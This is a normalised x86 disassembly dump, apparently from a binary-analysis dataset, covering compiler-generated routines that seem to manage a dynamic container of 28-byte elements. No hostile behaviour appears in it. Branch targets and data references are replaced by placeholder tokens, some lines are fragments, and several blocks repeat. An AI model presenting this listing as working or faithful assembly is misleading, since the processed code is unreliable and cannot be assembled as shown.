mov edi [ esi + 0x38 ]
call sub_1002a0c8
xor edx edx
div edi
mov ebx [ esi + 0x34 ]
add esi 0x1c
lea edi [ ebp - 0x14 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x24 ] edx
call sub_1000f91a
mov ebx [ ebp - 0x24 ]
mov esi edi
call sub_1000f940
mov eax edi
call sub_10010249
mov ecx [ ebp - 0x18 ]
push eax
call sub_100025cf
and [ ebp - 0x4 ] 0x0
push [ ebp - 0x10 ]
lea eax [ ebp - 0x14 ]
push [ ebp - 0x14 ]
mov [ ebp - 0x1c ] 0x1
push eax
push [ ebp - 0x20 ]
call sub_1000f7b2
mov eax [ ebp - 0x18 ]
call sub_1002b37e
retn
mov eax esi
call sub_1000f68e
sub_1000f68e
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x2c
push ebx
push esi
mov esi eax
lea ecx [ esi + 0x4 ]
mov eax [ ecx + 0x10 ]
sub eax [ ecx + 0xc ]
push edi
push 0x1c
mov [ esp + 0x14 ] ecx
pop ecx
cdq
idiv ecx
sub esp 0x1c
mov ecx esp
mov [ esp + 0x34 ] esp
mov edi eax
call sub_10001bdf
add esi 0x1c
push edi
mov ecx esi
call sub_1000f98c
mov ebx [ esi + 0x18 ]
lea edi [ esp + 0x20 ]
call sub_1000f91a
mov edi [ esp + 0x10 ]
mov ebx [ edi + 0x10 ]
lea esi [ esp + 0x28 ]
call sub_1000986e
mov ebx [ edi + 0xc ]
lea esi [ esp + 0x10 ]
call sub_1000986e
mov eax [ esp + 0x24 ]
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x2c ]
sub eax [ esp + 0x14 ]
push 0x1c
cdq
pop ecx
idiv ecx
mov esi [ esp + 0x20 ]
lea edi [ esp + 0x30 ]
mov [ esp + 0x18 ] esi
mov ebx eax
lea eax [ esp + 0x18 ]
call sub_1000fa80
test esi esi
je r-xdata
xor esi esi
mov esi [ esi ]
jmp r-xdata
cmp esi [ esp + 0x2c ]
jne r-xdata
mov eax [ esi ]
mov esi [ esp + 0x14 ]
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x1c ] eax
jmp r-xdata
lea eax [ esp + 0x18 ]
call sub_10010249
push 0xffffffff
push 0x0
push esi
mov ecx eax
call sub_1000253c
inc [ esp + 0x1c ]
add esi 0x1c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000f766
push ebx
push esi
mov esi eax
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x1c ] ebx
jne r-xdata
call sub_1000fa50
push edi
mov edi [ esi + 0x14 ]
jmp r-xdata
mov eax [ esi + 0x10 ]
cmp edi ebx
ja r-xdata
dec edi
lea eax [ eax + edi * 4 ]
cmp [ eax ] ebx
je r-xdata
pop edi
cmp eax ebx
je r-xdata
push [ eax ]
call sub_100272e8
pop ecx
push [ esi ]
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] ebx
call sub_100272e8
pop ecx
pop esi
pop ebx
retn
push eax
call sub_100272e8
pop ecx
sub_1000f7b2
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ecx
mov eax [ ebp + 0x10 ]
push ebx
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x14 ]
push esi
xor ebx ebx
inc ebx
lea esi [ esp + 0x8 ]
mov [ esp + 0xc ] eax
call sub_1000f940
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_1000f7f7
mov eax [ ebp + 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_1000f7f7
push ebp
mov ebp esp
sub esp 0x28
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
mov esi eax
lea edi [ ebp - 0x20 ]
call sub_1000f91a
mov ebx [ ebp + 0x18 ]
lea edi [ ebp - 0x18 ]
call sub_1000f91a
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x10 ]
call sub_1000f91a
mov ebx [ ebp - 0x20 ]
test ebx ebx
je r-xdata
call sub_10027827
cmp ebx [ ebp - 0x10 ]
je r-xdata
call sub_10027827
cmp [ ebp - 0x18 ] ebx
je r-xdata
mov edi [ ebp - 0x1c ]
mov eax edi
sub eax [ ebp - 0xc ]
cmp [ ebp - 0xc ] edi
cmp [ ebp - 0x18 ] 0x0
mov [ ebp - 0xc ] eax
je r-xdata
call sub_10027827
cmp eax [ ebp - 0x18 ]
je r-xdata
mov ebx [ esi + 0x1c ]
mov eax [ ebp - 0x14 ]
add ebx [ esi + 0x18 ]
sub eax edi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x8 ] eax
call sub_1000f91a
mov eax [ ebp - 0x28 ]
test eax eax
je r-xdata
mov ebx [ esi + 0x1c ]
add ebx [ esi + 0x18 ]
call sub_1000f91a
push [ ebp - 0x1c ]
lea eax [ ebp - 0x28 ]
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push eax
call sub_10010093
add esp 0x1c
cmp [ ebp - 0x8 ] 0x0
jbe r-xdata
mov ebx [ esi + 0x18 ]
call sub_1000f91a
push [ ebp - 0x14 ]
lea eax [ ebp - 0x28 ]
push [ ebp - 0x18 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push eax
call sub_1001003e
add esp 0x1c
cmp [ ebp - 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x14 ]
lea edi [ ebp - 0x28 ]
cmp [ ebp - 0xc ] eax
jae r-xdata
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x28 ]
call sub_1000f91a
mov ebx [ ebp - 0xc ]
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x28 ]
call sub_1000fa80
mov eax edi
pop edi
pop esi
pop ebx
leave
retn 0x14
call sub_1000fa50
dec [ ebp - 0x8 ]
jne r-xdata
call sub_1000fa1f
dec [ ebp - 0x8 ]
jne r-xdata
jmp r-xdata
sub_1000f91a
and [ edi ] 0x0
test esi esi
je r-xdata
call sub_10027827
mov eax [ esi + 0x18 ]
cmp eax ebx
ja r-xdata
mov ecx [ esi + 0x1c ]
add ecx eax
cmp ebx ecx
jbe r-xdata
mov eax [ esi ]
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov eax edi
retn
sub_1000f940
mov eax [ esi ]
push edi
test eax eax
jne r-xdata
mov edi [ eax ]
jmp r-xdata
call sub_10027827
mov eax [ esi ]
test eax eax
je r-xdata
test eax eax
je r-xdata
xor edi edi
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
call sub_10027827
test eax eax
je r-xdata
mov ecx [ ecx + 0x1c ]
mov edx [ esi + 0x4 ]
add ecx [ edi + 0x18 ]
add edx ebx
pop edi
cmp edx ecx
ja r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
add [ esi + 0x4 ] ebx
mov eax esi
retn
cmp edx [ eax + 0x18 ]
jae r-xdata
sub_1000f98c
push 0x1c
mov eax sub_1005123f
call sub_1002b2a6
mov esi ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x1c ]
cmp [ ebp + 0x8 ] eax
jbe r-xdata
jae r-xdata
mov ebx [ esi + 0x18 ]
add ebx eax
lea edi [ ebp - 0x18 ]
call sub_1000f91a
push [ ebp - 0x14 ]
lea eax [ ebp + 0xc ]
push [ ebp - 0x18 ]
mov ecx esi
push eax
mov eax [ ebp + 0x8 ]
sub eax [ esi + 0x1c ]
push eax
call sub_1000faa9
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp + 0xc ]
call sub_1000264e
call sub_1002b37e
retn 0x20
mov ebx [ esi + 0x18 ]
add ebx eax
lea edi [ ebp - 0x18 ]
call sub_1000f91a
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x20 ]
call sub_1000f91a
mov ebx [ ebp + 0x8 ]
lea edi [ ebp - 0x28 ]
lea eax [ ebp - 0x20 ]
call sub_1000fa80
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x20 ]
push eax
mov eax esi
call sub_1000f7f7
sub_1000fa1f
cmp [ esi + 0x1c ] 0x0
je r-xdata
retn
mov eax [ esi + 0x18 ]
mov ecx [ esi + 0x10 ]
mov ecx [ ecx + eax * 4 ]
push 0x0
push 0x1
call sub_1000264e
inc [ esi + 0x18 ]
mov eax [ esi + 0x18 ]
cmp [ esi + 0x14 ] eax
ja r-xdata
dec [ esi + 0x1c ]
jne r-xdata
and [ esi + 0x18 ] 0x0
and [ esi + 0x18 ] 0x0
sub_1000fa50
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
retn
mov ecx [ esi + 0x18 ]
lea eax [ eax + ecx - 0x1 ]
mov ecx [ esi + 0x14 ]
cmp ecx eax
ja r-xdata
mov ecx [ esi + 0x10 ]
mov ecx [ ecx + eax * 4 ]
push 0x0
push 0x1
call sub_1000264e
dec [ esi + 0x1c ]
jne r-xdata
sub eax ecx
and [ esi + 0x18 ] 0x0
sub_1000fa80
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push esi
lea esi [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
call sub_1000f940
mov eax [ ebp - 0x8 ]
mov [ edi ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop esi
leave
retn
sub_1000faa9
push 0x7c
mov eax sub_10050968
call sub_1002b345
mov eax [ ebp + 0xc ]
mov esi ecx
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x7c ]
mov [ ebp - 0x80 ] esi
mov [ ebp - 0x70 ] eax
call sub_1000f91a
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_10027827
cmp eax [ ebp - 0x7c ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x3
cmp edi eax
jae r-xdata
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
cmp ebx edi
jae r-xdata
mov eax [ ebp + 0x14 ]
sub eax [ ebp - 0x78 ]
mov [ ebp - 0x5c ] eax
mov eax [ esi + 0x1c ]
mov ebx [ ebp - 0x5c ]
mov edi eax
sub edi ebx
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x78 ] eax
cmp ebx edi
jae r-xdata
and [ ebp - 0x54 ] 0x0
sub eax edi
mov ebx eax
mov [ ebp - 0x54 ] edi
sub edi ebx
call sub_1000f91a
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1000fa80
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push [ ebp - 0x70 ]
mov [ ebp - 0x58 ] ecx
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x54 ] eax
call sub_100025cf
mov [ ebp - 0x4 ] 0x4
mov ebx [ ebp - 0x60 ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x58 ]
call sub_1000fa80
mov esi eax
lea edi [ ebp - 0x6c ]
lea eax [ ebp - 0x58 ]
call sub_1000fa80
mov ebx [ ebp + 0x8 ]
mov edx ebx
lea edi [ ebp - 0x64 ]
call sub_1000feab
push [ esi + 0x4 ]
push [ esi ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x74 ]
push [ ebp - 0x54 ]
push [ ebp - 0x58 ]
push eax
call sub_1001003e
add esp 0x1c
lea edi [ ebp - 0x74 ]
lea eax [ ebp - 0x58 ]
call sub_1000fa80
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
push [ ebp - 0x54 ]
push [ ebp - 0x58 ]
push eax
call sub_100100e8
lea ecx [ ebp - 0x50 ]
call sub_1000f91a
mov ebx [ ebp - 0x54 ]
sub ebx [ ebp + 0x8 ]
lea edi [ ebp - 0x88 ]
add ebx [ ebp - 0x60 ]
lea eax [ ebp - 0x6c ]
add ebx [ ebp - 0x5c ]
call sub_1000fa80
call sub_10010249
push eax
mov eax esi
call sub_1000fe56
inc [ ebp - 0x54 ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x54 ] 0x0
push [ ebp - 0x70 ]
mov eax esi
call sub_1000fe56
dec ebx
jmp r-xdata
call sub_1000fa80
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push [ ebp - 0x70 ]
mov [ ebp - 0x58 ] ecx
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x54 ] eax
call sub_100025cf
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x6c ]
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x4 ] 0x1
call sub_1000fa80
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x60 ] eax
lea edi [ ebp - 0x74 ]
lea eax [ ebp - 0x58 ]
call sub_1000fa80
push [ ebp - 0x54 ]
mov ecx [ ebp - 0x60 ]
push [ ebp - 0x58 ]
push [ ecx + 0x4 ]
push [ ecx ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x64 ]
push eax
call sub_10010093
mov ebx [ esi + 0x18 ]
add esp 0x1c
lea edi [ ebp - 0x64 ]
call sub_1000f91a
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x6c ]
lea eax [ ebp - 0x58 ]
call sub_1000fa80
mov esi eax
lea edi [ ebp - 0x74 ]
lea eax [ ebp - 0x64 ]
call sub_1000fa80
push [ esi + 0x4 ]
push [ esi ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x34 ]
push eax
call sub_100100e8
lea ecx [ ebp - 0x34 ]
jmp r-xdata
dec ebx
call sub_1000fa80
call sub_10010249
push eax
mov eax esi
call sub_1000fe07
dec [ ebp - 0x54 ]
jmp r-xdata
mov [ ebp - 0x54 ] ebx
push [ ebp - 0x70 ]
mov eax esi
call sub_1000fe07
dec edi
jmp r-xdata
call sub_1002b3a1
retn 0x10
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x6c ]
cmp [ ebp - 0x54 ] eax
jae r-xdata
call sub_1000f91a
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1000fa80
mov ebx [ ebp - 0x60 ]
lea edi [ ebp - 0x88 ]
jmp r-xdata
call sub_1000f91a
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x54 ]
lea ebx [ ecx + eax ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1000fa80
call sub_10010249
push eax
mov eax esi
call sub_1000fe56
inc [ ebp - 0x54 ]
mov edi [ ebp - 0x60 ]
jmp r-xdata
test ebx ebx
jbe r-xdata
add esp 0x14
push 0x0
push 0x1
call sub_1000264e
jmp r-xdata
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x64 ]
call sub_1000f91a
cmp [ ebp - 0x54 ] 0x0
mov ebx [ ebp + 0x8 ]
lea edi [ ebp - 0x6c ]
lea eax [ ebp - 0x64 ]
jbe r-xdata
call sub_1000fa80
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x6c ]
dec ebx
call sub_1000fa80
call sub_10010249
push eax
mov eax esi
call sub_1000fe07
dec [ ebp - 0x54 ]
jmp r-xdata
test edi edi
jbe r-xdata
mov esi [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x54 ] eax
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x58 ] esi
call sub_1000fa80
push [ eax + 0x4 ]
push [ eax ]
push [ ebp - 0x54 ]
push esi
push [ ebp - 0x70 ]
call sub_100100e8
add esp 0x14
cmp [ ebp - 0x54 ] edi
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x6c ]
jae r-xdata
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x64 ]
call sub_1000f91a
cmp [ ebp - 0x54 ] 0x0
mov ebx [ ebp + 0x8 ]
lea edi [ ebp - 0x6c ]
lea eax [ ebp - 0x64 ]
jbe r-xdata
sub_1000fc61
mov esi [ ebp - 0x80 ]
mov edi [ ebp - 0x78 ]
jmp r-xdata
cmp edi [ esi + 0x1c ]
jb r-xdata
call sub_1000fa1f
push 0x0
push 0x0
call sub_1002ae74
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x3
cmp edi eax
jae r-xdata
and [ ebp - 0x54 ] 0x0
sub eax edi
mov ebx eax
call sub_1000f91a
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1000fa80
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push [ ebp - 0x70 ]
mov [ ebp - 0x58 ] ecx
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x54 ] eax
call sub_100025cf
mov [ ebp - 0x4 ] 0x4
mov ebx [ ebp - 0x60 ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x58 ]
call sub_1000fa80
mov esi eax
lea edi [ ebp - 0x6c ]
lea eax [ ebp - 0x58 ]
call sub_1000fa80
mov ebx [ ebp + 0x8 ]
mov edx ebx
lea edi [ ebp - 0x64 ]
call sub_1000feab
push [ esi + 0x4 ]
push [ esi ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x74 ]
push [ ebp - 0x54 ]
push [ ebp - 0x58 ]
push eax
call sub_1001003e
add esp 0x1c
lea edi [ ebp - 0x74 ]
lea eax [ ebp - 0x58 ]
call sub_1000fa80
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
push [ ebp - 0x54 ]
push [ ebp - 0x58 ]
push eax
call sub_100100e8
lea ecx [ ebp - 0x50 ]
add esp 0x14
push 0x0
push 0x1
call sub_1000264e
jmp r-xdata
call sub_1000f91a
mov ebx [ ebp - 0x54 ]
sub ebx [ ebp + 0x8 ]
lea edi [ ebp - 0x88 ]
add ebx [ ebp - 0x60 ]
lea eax [ ebp - 0x6c ]
add ebx [ ebp - 0x5c ]
call sub_1000fa80
call sub_10010249
push eax
mov eax esi
call sub_1000fe56
inc [ ebp - 0x54 ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x54 ] 0x0
push [ ebp - 0x70 ]
mov eax esi
call sub_1000fe56
dec ebx
jmp r-xdata
call sub_1002b3a1
retn 0x10
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x6c ]
cmp [ ebp - 0x54 ] eax
jae r-xdata
call sub_1000f91a
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1000fa80
mov ebx [ ebp - 0x60 ]
lea edi [ ebp - 0x88 ]
jmp r-xdata
call sub_1000f91a
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x54 ]
lea ebx [ ecx + eax ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1000fa80
call sub_10010249
push eax
mov eax esi
call sub_1000fe56
inc [ ebp - 0x54 ]
mov edi [ ebp - 0x60 ]
jmp r-xdata
test ebx ebx
jbe r-xdata
mov esi [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x54 ] eax
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x58 ] esi
call sub_1000fa80
push [ eax + 0x4 ]
push [ eax ]
push [ ebp - 0x54 ]
push esi
push [ ebp - 0x70 ]
call sub_100100e8
add esp 0x14
cmp [ ebp - 0x54 ] edi
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x6c ]
jae r-xdata
sub_1000fdf0
mov esi [ ebp - 0x80 ]
mov edi [ ebp - 0x78 ]
jmp r-xdata
cmp edi [ esi + 0x1c ]
jb r-xdata
call sub_1000fa50
jmp r-xdata
push 0x0
push 0x0
call sub_1002ae74
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x3
cmp edi eax
jae r-xdata
and [ ebp - 0x54 ] 0x0
sub eax edi
mov ebx eax
call sub_1000f91a
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1000fa80
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push [ ebp - 0x70 ]
mov [ ebp - 0x58 ] ecx
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x54 ] eax
call sub_100025cf
mov [ ebp - 0x4 ] 0x4
mov ebx [ ebp - 0x60 ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x58 ]
call sub_1000fa80
mov esi eax
lea edi [ ebp - 0x6c ]
lea eax [ ebp - 0x58 ]
call sub_1000fa80
mov ebx [ ebp + 0x8 ]
mov edx ebx
lea edi [ ebp - 0x64 ]
call sub_1000feab
push [ esi + 0x4 ]
push [ esi ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x74 ]
push [ ebp - 0x54 ]
push [ ebp - 0x58 ]
push eax
call sub_1001003e
add esp 0x1c
lea edi [ ebp - 0x74 ]
lea eax [ ebp - 0x58 ]
call sub_1000fa80
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
push [ ebp - 0x54 ]
push [ ebp - 0x58 ]
push eax
call sub_100100e8
lea ecx [ ebp - 0x50 ]
add esp 0x14
push 0x0
push 0x1
call sub_1000264e
jmp r-xdata
call sub_1000f91a
mov ebx [ ebp - 0x54 ]
sub ebx [ ebp + 0x8 ]
lea edi [ ebp - 0x88 ]
add ebx [ ebp - 0x60 ]
lea eax [ ebp - 0x6c ]
add ebx [ ebp - 0x5c ]
call sub_1000fa80
call sub_10010249
push eax
mov eax esi
call sub_1000fe56
inc [ ebp - 0x54 ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
and [ ebp - 0x54 ] 0x0
push [ ebp - 0x70 ]
mov eax esi
call sub_1000fe56
dec ebx
jmp r-xdata
call sub_1002b3a1
retn 0x10
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x6c ]
cmp [ ebp - 0x54 ] eax
jae r-xdata
call sub_1000f91a
mov ebx [ ebp - 0x5c ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1000fa80
mov ebx [ ebp - 0x60 ]
lea edi [ ebp - 0x88 ]
jmp r-xdata
call sub_1000f91a
mov eax [ ebp - 0x5c ]
mov ecx [ ebp - 0x54 ]
lea ebx [ ecx + eax ]
lea edi [ ebp - 0x88 ]
lea eax [ ebp - 0x6c ]
call sub_1000fa80
call sub_10010249
push eax
mov eax esi
call sub_1000fe56
inc [ ebp - 0x54 ]
mov edi [ ebp - 0x60 ]
jmp r-xdata
test ebx ebx
jbe r-xdata
mov esi [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x54 ] eax
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x58 ] esi
call sub_1000fa80
push [ eax + 0x4 ]
push [ eax ]
push [ ebp - 0x54 ]
push esi
push [ ebp - 0x70 ]
call sub_100100e8
add esp 0x14
cmp [ ebp - 0x54 ] edi
mov ebx [ esi + 0x18 ]
lea edi [ ebp - 0x6c ]
jae r-xdata
sub_1000fe07
push esi
mov esi eax
mov eax [ esi + 0x1c ]
inc eax
push edi
cmp [ esi + 0x14 ] eax
ja r-xdata
mov edi [ esi + 0x18 ]
test edi edi
jne r-xdata
call sub_1000feda
mov eax [ esi + 0x10 ]
dec edi
cmp [ eax + edi * 4 ] 0x0
jne r-xdata
mov edi [ esi + 0x14 ]
mov eax [ esi + 0x10 ]
push [ esp + 0xc ]
mov ecx [ eax + edi * 4 ]
call sub_10001b56
inc [ esi + 0x1c ]
pop ecx
mov [ esi + 0x18 ] edi
pop edi
pop esi
retn 0x4
xor ecx ecx
inc ecx
call sub_10001a37
mov ecx [ esi + 0x10 ]
mov [ ecx + edi * 4 ] eax
sub_1000fe56
push esi
mov esi eax
mov eax [ esi + 0x1c ]
inc eax
push edi
cmp [ esi + 0x14 ] eax
ja r-xdata
mov eax [ esi + 0x18 ]
add eax [ esi + 0x1c ]
mov ecx [ esi + 0x14 ]
cmp ecx eax
ja r-xdata
call sub_1000feda
mov edi eax
mov eax [ esi + 0x10 ]
shl edi 0x2
cmp [ edi + eax ] 0x0
jne r-xdata
sub eax ecx
mov eax [ esi + 0x10 ]
push [ esp + 0xc ]
mov ecx [ eax + edi ]
call sub_10001b56
inc [ esi + 0x1c ]
pop ecx
pop edi
pop esi
retn 0x4
xor ecx ecx
inc ecx
call sub_10001a37
mov ecx [ esi + 0x10 ]
mov [ edi + ecx ] eax
sub_1000feab
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push ebx
mov ebx edx
push esi
neg ebx
lea esi [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
call sub_1000f940
mov eax [ ebp - 0x8 ]
mov [ edi ] eax
mov eax [ ebp - 0x4 ]
pop esi
mov [ edi + 0x4 ] eax
mov eax edi
pop ebx
leave
retn
sub_1000feda
push ebp
mov ebp esp
mov eax [ esi + 0x14 ]
sub esp 0x10
push ebx
mov edx 0x9249249
xor ebx ebx
mov ecx edx
inc ebx
sub ecx eax
push edi
cmp ecx ebx
jae r-xdata
mov ecx eax
shr ecx 0x1
cmp ecx 0x8
jae r-xdata
call sub_1000ffb3
cmp ecx ebx
jbe r-xdata
push 0x8
pop ecx
mov edi [ esi + 0x18 ]
lea ecx [ eax + ebx ]
mov [ ebp - 0x4 ] edi
call sub_1000fff2
mov ecx [ esi + 0x10 ]
shl edi 0x2
mov [ ebp - 0x8 ] eax
lea edx [ edi + eax ]
mov eax [ esi + 0x14 ]
lea eax [ ecx + eax * 4 ]
add ecx edi
push ecx
call sub_1001012d
pop ecx
mov ecx [ esi + 0x10 ]
mov edx eax
push ecx
cmp [ ebp - 0x4 ] ebx
ja r-xdata
sub edx ecx
cmp eax edx
ja r-xdata
lea eax [ ecx + ebx * 4 ]
call sub_1001012d
mov edx [ ebp - 0x8 ]
pop ecx
mov ecx [ esi + 0x10 ]
lea eax [ ecx + edi ]
lea ecx [ ecx + ebx * 4 ]
push ecx
call sub_1001012d
pop ecx
mov edi eax
test ebx ebx
jbe r-xdata
mov eax ebx
sub eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
lea eax [ ecx + edi ]
call sub_1001012d
pop ecx
mov ecx [ ebp - 0xc ]
mov edi eax
test ecx ecx
jbe r-xdata
mov ebx ecx
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov ecx ebx
mov ecx [ ebp - 0x4 ]
test ecx ecx
jbe r-xdata
xor eax eax
[ edi ]
mov eax [ ebp - 0x8 ]
add [ esi + 0x14 ] ebx
pop edi
mov [ esi + 0x10 ] eax
pop ebx
leave
retn
push eax
call sub_100272e8
pop ecx
mov edi [ ebp - 0x8 ]
jmp r-xdata
xor eax eax
[ edi ]
sub_1000ffb3
push 0x44
mov eax sub_100502d2
call sub_1002b2a6
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_10001ca0
push r--data
lea eax [ ebp - 0x50 ]
push eax
mov [ ebp - 0x50 ] r--data
call sub_1002ae74
int3
sub_1000fff2
push ebp
mov ebp esp
sub esp 0x10
test ecx ecx
ja r-xdata
or eax 0xffffffff
xor edx edx
div ecx
cmp eax 0x4
jae r-xdata
xor ecx ecx
mov eax ecx
shl eax 0x2
push eax
call sub_1002738b
pop ecx
leave
retn
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_10027401
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_1002ae74
int3
sub_1001003e
push ebp
mov ebp esp
push ecx
push esi
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov edx [ eax ]
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x18 ]
test eax eax
je r-xdata
push [ ebp + 0x20 ]
mov ecx [ ebp + 0x10 ]
push [ ebp + 0x1c ]
mov eax [ eax ]
push esi
push edx
push ecx
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_10010154
mov eax [ ebp + 0x8 ]
add esp 0x28
pop edi
pop esi
leave
retn
sub_10010093
push ebp
mov ebp esp
push ecx
push esi
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
xor eax eax
mov eax [ eax ]
jmp r-xdata
mov edx [ eax ]
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x18 ]
test eax eax
je r-xdata
push [ ebp + 0x20 ]
mov ecx [ ebp + 0x10 ]
push [ ebp + 0x1c ]
mov eax [ eax ]
push esi
push edx
push ecx
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
push [ ebp + 0x8 ]
call sub_100101cd
mov eax [ ebp + 0x8 ]
add esp 0x28
pop edi
pop esi
leave
retn
sub_100100e8
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub esp 0x10
push esi
mov esi [ ebp + 0x18 ]
